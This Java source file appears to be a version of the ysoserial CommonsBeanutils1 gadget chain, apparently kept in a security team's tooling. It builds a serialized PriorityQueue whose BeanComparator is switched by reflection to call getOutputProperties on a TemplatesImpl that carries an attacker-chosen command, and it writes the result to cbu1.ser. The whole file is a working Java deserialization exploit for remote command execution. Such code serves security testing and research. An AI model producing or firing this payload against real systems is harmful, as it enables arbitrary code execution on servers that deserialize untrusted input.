package com.salesforce.trust.s11n.payload;

import org.apache.commons.beanutils.BeanComparator;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.util.PriorityQueue;

public class CommonsBeanutils1 implements ObjectPayload<Object>, InvocationHandler {

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        // 用lowestSetBit的原因是 只有lowestSetBit 才有 getter方法
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cbu1.ser"));
        oos.writeObject(queue);
        return queue;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        return null;
    }
}
